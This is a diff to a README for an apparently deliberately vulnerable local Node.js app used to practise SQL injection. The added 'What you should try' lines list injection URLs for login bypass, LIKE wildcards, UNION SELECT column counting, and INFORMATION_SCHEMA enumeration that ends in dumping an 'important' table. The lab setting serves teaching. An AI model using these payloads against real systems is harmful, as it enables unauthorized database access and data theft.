@@ -36,7 +36,7 @@ After that run this commands:
 
 `npm install`
 
-than
+then
 
 `node index` or `nodemon`
 
@@ -48,14 +48,33 @@ http://localhost:3000/login/Admin&1234567
 
 ### What you should try
 
+http://localhost:3000/getUsers
+
+http://localhost:3000/getUser/1
+<br>
 http://localhost:3000/getUser/1'--%20
 
+http://localhost:3000/login/admin&1234567
+<br>
 http://localhost:3000/login/admin'--%20&1234567
 
-http://localhost:3000/loginLike/Admin&%25
+http://localhost:3000/loginLike/admin&1234567
+<br>
+http://localhost:3000/loginLike/admin&%25
 
+
+http://localhost:3000/getUserInfo/1
+<br>
 http://localhost:3000/getUserInfo/1'%20UNION%20SELECT%201,2,3%20--%20'
-
+<br>
 http://localhost:3000/getUserInfo/1'%20GROUP%20BY%205%20--%20'
+<br>
 http://localhost:3000/getUserInfo/1'%20GROUP%20BY%204%20--%20'
+<br>
 http://localhost:3000/getUserInfo/1'%20GROUP%20BY%203%20--%20'
+<br>
+http://localhost:3000/getUserInfo/-1'%20UNION%20SELECT%201,2,TABLE_NAME%20FROM%20INFORMATION_SCHEMA.TABLES%20%20--%20
+<br>
+http://localhost:3000/getUserInfo/-1'%20UNION%20SELECT%201,2,COLUMN_NAME%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME='important'%20--%20
+<br>
+http://localhost:3000/getUserInfo/-1'%20UNION%20SELECT%201,id,info%20FROM%20important%20--%20
